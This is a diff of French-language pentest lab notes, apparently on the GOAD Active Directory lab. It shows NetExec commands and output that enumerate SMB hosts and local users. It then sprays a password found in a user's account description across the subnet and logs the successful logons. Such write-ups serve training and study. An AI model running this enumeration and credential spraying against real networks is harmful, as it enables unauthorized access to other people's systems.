@@ -4,6 +4,8 @@
 
 **<span style="color: #dddddd;">🖥️</span> NetExec**
 
+Enumeration des machines
+
 ```
 ┌─[m0rph3u5@parrot]─[~/Documents]
 └──╼ $nxc smb 192.168.56.1/24                                       
@@ -12,9 +14,9 @@ SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019
 SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
 SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
 SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
-Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 
 ```
+Enumeratin des utilisateurs
 
 ```
 ┌─[m0rph3u5@parrot]─[~/Documents]
@@ -36,6 +38,29 @@ SMB         192.168.56.11   445    WINTERFELL       samwell.tarly               
 SMB         192.168.56.11   445    WINTERFELL       jeor.mormont                  2025-07-22 13:56:54 0       Jeor Mormont 
 SMB         192.168.56.11   445    WINTERFELL       sql_svc                       2025-07-22 13:57:02 0       sql service 
 SMB         192.168.56.11   445    WINTERFELL       [*] Enumerated 10 local users: NORTH
-Running nxc against 5 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
 
 ```
+
+Test du mot de passe trouver dans la description du compte `Samwell Tarly`
+
+```
+┌─[m0rph3u5@parrot]─[~/Documents]
+└──╼ $nxc smb 192.168.56.1/24 -u samwell.tarly -p Heartsbane
+SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
+SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
+SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
+SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
+SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\samwell.tarly:Heartsbane (Guest)
+SMB         192.168.56.12   445    MEEREEN          [-] essos.local\samwell.tarly:Heartsbane STATUS_LOGON_FAILURE 
+SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
+SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\samwell.tarly:Heartsbane STATUS_LOGON_FAILURE
+
+```
+
+
+
+
+
+
